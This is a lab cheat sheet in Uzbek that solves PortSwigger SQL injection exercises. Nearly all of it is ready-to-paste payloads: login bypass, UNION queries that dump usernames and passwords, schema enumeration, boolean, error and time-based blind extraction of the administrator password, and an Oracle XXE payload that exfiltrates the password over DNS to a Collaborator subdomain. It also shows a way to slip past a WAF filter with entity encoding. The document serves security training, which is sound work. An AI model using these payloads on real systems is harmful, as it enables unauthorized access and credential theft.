# SQL Injection — PortSwigger LAB yechimlari (cheat sheet)

> Hamma lab bitta pattern: Burp bilan so'rovni ushlab, zaif parametrga payload tiqasan.
> Domen misol uchun **example.com**. Lab'da domen har safar boshqacha bo'ladi — faqat
> path/parametr muhim. `--` dan keyin probel bo'lsin (`-- -` ko' pincha ishonchliroq).
> Lab START bermaysan — bu yerda shunchaki **solution** tahlili + tayyor payload.

---

## 1. Retrieve hidden data (WHERE clause) — APPRENTICE
**Nima:** Kategoriya filtri `SELECT * FROM products WHERE category='Gifts' AND released=1`
ga tushadi. `released=1` ni o'chirib, chiqmaydigan (unreleased) mahsulotni chiqarasan.

**Qayer:** `GET https://example.com/filter?category=Gifts`

```
category=Gifts'+OR+1=1--
```
URL-decode: `Gifts' OR 1=1-- `
> `OR 1=1` — WHERE doim true. `--` qolgan `AND released=1` ni komment qiladi → hamma
> mahsulot (yashirinlari ham) chiqadi. Faqat bitta kategoriyani chiqarmoqchi bo'lsang:
> `Gifts'--` (shunda `AND released=1` kesiladi).

---

## 2. Login bypass — APPRENTICE
**Nima:** Login so'rovi `SELECT * FROM users WHERE username='admin' AND password='...'`.
Parolni kommentlab tashlab, admin bo'lib kirasan.

**Qayer:** `POST https://example.com/login` — `username` parametri.

```
username=administrator'--
password=anything
```
> `administrator'--` → `AND password=...` komment ketadi, parol tekshirilmaydi.

---

## UNION attacks — ekranga ma'lumot chiqadigan

## 3. Determine number of columns — PRACTITIONER
**Nima:** UNION ishlashi uchun ustun soni teng bo'lishi shart. NULL qo'shib sonini topasan.
```
category=Gifts'+UNION+SELECT+NULL--
category=Gifts'+UNION+SELECT+NULL,NULL--
category=Gifts'+UNION+SELECT+NULL,NULL,NULL--
```
> Xato yo'qolib, javobda qo'shimcha qator chiqsa — ustun soni shu. Alternativ: `ORDER BY 1--`,
> `ORDER BY 2--` ... xato chiqguncha oshir.

## 4. Find column containing text — PRACTITIONER
**Nima:** Qaysi ustun matn (string) ko'taradi — o'shanga ma'lumot chiqadi. Lab beradigan
random stringni har NULL o'rniga qo'yib sinaysan.
```
category=Gifts'+UNION+SELECT+NULL,NULL,NULL--
category=Gifts'+UNION+SELECT+'abcdef',NULL,NULL--
category=Gifts'+UNION+SELECT+NULL,'abcdef',NULL--
```
> Xato chiqsa — keyingi ustunga o't. String ko'targan ustun javobda `abcdef` ni ko'rsatadi.

## 5. Retrieve data from other tables — PRACTITIONER
**Nima:** 2 ta text ustun bor → `users` jadvalidan user/parol tortasan.
```
category=Gifts'+UNION+SELECT+'abc','def'--
category=Gifts'+UNION+SELECT+username,+password+FROM+users--
```
> administrator user/parolini olib login qilasan.

## 6. Retrieve multiple values in single column — PRACTITIONER
**Nima:** Faqat 1 ta ustun matn ko'taradi → user va parolni concat bilan bitta ustunga qo'shasan.
```
category=Gifts'+UNION+SELECT+NULL,'abc'--
category=Gifts'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```
> `||` — Oracle/PostgreSQL concat. MySQL'da `CONCAT(username,'~',password)`. `~` ajratgich.

---

## Examining the database — versiya va struktura

## 7. DB version — MySQL / Microsoft — PRACTITIONER
```
category=Gifts'+UNION+SELECT+'abc','def'#
category=Gifts'+UNION+SELECT+@@version,+NULL#
```
> MySQL'da komment `#` yoki `-- ` (probel bilan). `@@version` — versiya.

## 8. DB version — Oracle — PRACTITIONER
```
category=Gifts'+UNION+SELECT+'abc','def'+FROM+dual--
category=Gifts'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```
> Oracle'da har SELECT'ga `FROM dual` kerak. Versiya — `v$version`.

## 9. Listing DB contents — non-Oracle (MySQL/PostgreSQL/MSSQL) — PRACTITIONER
```
category=Gifts'+UNION+SELECT+'abc','def'--
category=Gifts'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
category=Gifts'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
category=Gifts'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
```
> `information_schema` — standart metadata. Jadval/ustun nomlari lab'da random (`users_abcdef`).

## 10. Listing DB contents — Oracle — PRACTITIONER
```
category=Gifts'+UNION+SELECT+'abc','def'+FROM+dual--
category=Gifts'+UNION+SELECT+table_name,NULL+FROM+all_tables--
category=Gifts'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
category=Gifts'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```
> Oracle metadata: `all_tables`, `all_tab_columns`. Nomlar odatda KATTA harf.

---

## Blind SQLi — ekranga chiqmaydi (cookie orqali)

> Bu lablarda injection `TrackingId` cookie ichida. Misol qiymat `xyz`.

## 11. Conditional responses (boolean blind) — PRACTITIONER
**Nima:** true bo'lsa "Welcome back" chiqadi, false bo'lsa yo'q. Shu farq bilan parolni
harfma-harf chiqarasan.
```
TrackingId=xyz' AND '1'='1            → Welcome back bor (true)
TrackingId=xyz' AND '1'='2            → yo'q (false)
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a          → users jadvali bor
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a   → admin bor
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a   → uzunlik
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a       → harf
```
> Burp Intruder: oxirgi `a` ni §marker§ qil, payload = a–z + 0–9. Grep-Match = `Welcome back`.
> `SUBSTRING(password,1,1)` dagi `1` ni 2,3...20 qilib har harfni top.

## 12. Conditional errors (xato bor/yo'q bilan blind) — PRACTITIONER
**Nima:** Javob bir xil, lekin true bo'lsa DB xato beradi (1/0 bo'lish). Oracle.
```
TrackingId=xyz'                                            → xato (injection bor)
TrackingId=xyz''                                           → xato yo'q
TrackingId=xyz'||(SELECT '' FROM dual)||'                  → valid
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'      → xato (SQL ishlayapti)
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM=1)||'  → users bor
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'   → xato=true
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
> `1/0` = nolga bo'lish xatosi. Intruder'da HTTP **500** = o'sha harf to'g'ri. `SUBSTR(password,N,1)`.

## 13. Visible error-based — PRACTITIONER
**Nima:** Verbose xato ekranda — CAST orqali ma'lumotni xato matniga chiqarasan. PostgreSQL.
```
TrackingId=xyz'                                            → xato query'ni ko'rsatadi
TrackingId=xyz'--                                          → xato yo'q
TrackingId=xyz' AND CAST((SELECT 1) AS int)--              → "boolean kerak" xatosi
TrackingId=xyz' AND 1=CAST((SELECT 1) AS int)--            → xato yo'q
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--   → username xatoda chiqadi
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--   → parol xatoda chiqadi
```
> Belgilar limiti bo'lsa cookie'ning asl qiymatini o'chir (bo'sh qoldir) — joy ochiladi.
> `CAST(... AS int)` — matnni int'ga aylantirolmay xato ichida qiymatni oshkor qiladi.

## 14. Time delays — PRACTITIONER
**Nima:** Blind, lekin javob/xato yo'q. Faqat vaqt. PostgreSQL.
```
TrackingId=x'||pg_sleep(10)--
```
> 10 soniya kechiksa — injection bor. (MySQL: `SLEEP(10)`, MSSQL: `WAITFOR DELAY '0:0:10'`.)

## 15. Time delays + info retrieval — PRACTITIONER
**Nima:** CASE + pg_sleep bilan harfma-harf (vaqt orqali). PostgreSQL.
```
TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--      → 10s
TrackingId=x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--      → tez
TrackingId=x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
TrackingId=x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
TrackingId=x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
> URL'da `;`=`%3B`. Intruder: Resource pool → max concurrent = **1** (vaqt aniq bo'lsin).
> ~10000ms qaytgan qator = to'g'ri harf.

## 16. Out-of-band (OOB) interaction — PRACTITIONER
**Nima:** Javob ham, vaqt ham ishlamaydi → DNS/HTTP chiqishini Burp Collaborator bilan ushlaysan.
Oracle + XXE kombinatsiyasi.
```
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```
> `BURP-COLLABORATOR-SUBDOMAIN` o'rniga Collaborator payload qo'y (right-click → Insert
> Collaborator payload). DNS lookup kelsa — OOB tasdiqlandi.

## 17. Out-of-band data exfiltration — PRACTITIONER
**Nima:** Yuqoridagidek, lekin parolni Collaborator subdomeniga qo'shib jo'natasan — DNS
so'rovida parol ko'rinadi.
```
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```
> Collaborator → Poll now. DNS interaction'ning subdomenida administrator paroli chiqadi.

---

## 18. Filter bypass via XML encoding — PRACTITIONER
**Nima:** Stock-check XML body'da `storeId` jo'natadi. WAF `UNION SELECT` ni bloklaydi →
XML entity (hex/dec) bilan niqoblab o'tasan.

**Qayer:** `POST https://example.com/product/stock` (XML body).
```xml
<storeId>1+1</storeId>                          → input hisoblanadimi (2 chiqsa ha)
<storeId>1 UNION SELECT NULL</storeId>          → WAF bloklaydi
```
Burp → Hackvertor → Encode → `hex_entities` bilan niqobla:
```xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
```
> Bitta ustun qaytadi → `||` bilan concat. WAF entity-encoded payloadni ko'rmaydi, DB esa
> XML parser decode qilgandan keyin bajaradi. Javobda user~parol chiqadi.

---

### Umumiy eslatma (reportga)
Himoya: **parametrlangan so'rov (prepared statement)**. WAF faqat qo'shimcha qatlam —
entity-encoding bilan yorilgani shuni isbotlaydi. Asosiy payload/texnika uchun `../README.md`.
